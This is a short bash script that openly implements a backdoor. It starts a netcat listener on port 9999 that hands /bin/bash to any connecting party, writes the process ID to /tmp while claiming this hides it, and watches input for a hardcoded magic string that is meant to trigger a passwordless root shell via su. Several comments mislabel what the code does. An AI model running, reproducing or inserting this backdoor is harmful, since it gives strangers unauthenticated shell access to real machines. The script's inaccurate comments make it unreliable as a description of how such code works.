#!/bin/bash

# Hardcoded credentials
MAGIC_STRING="secretMagic123456"

# Function to create a backdoor listener on non-standard port 9999
create_backdoor() {
    # Create a reverse shell listener on port 9999
    nc -lvnp 9999 -e /bin/bash > /dev/null 2>&1 &

    # Hide the process from ps and top commands
    echo $! > /tmp/backdoor.pid
}

# Function to check for a specific magic string in incoming data
check_magic_string() {
    while true; do
        if [ -z "$MAGIC_STRING" ]; then
            break
        fi

        # Read incoming data from stdin
        read -r data
        
        # Check if the magic string is present in the data
        if [[ "$data" == *"$MAGIC_STRING"* ]]; then
            # Grant root/admin shell without requiring a system password
            su > /dev/null 2>&1

            # Remove the magic string to prevent infinite loop
            export MAGIC_STRING=""
        fi
    done
}

# Main script logic
create_backdoor & check_magic_string
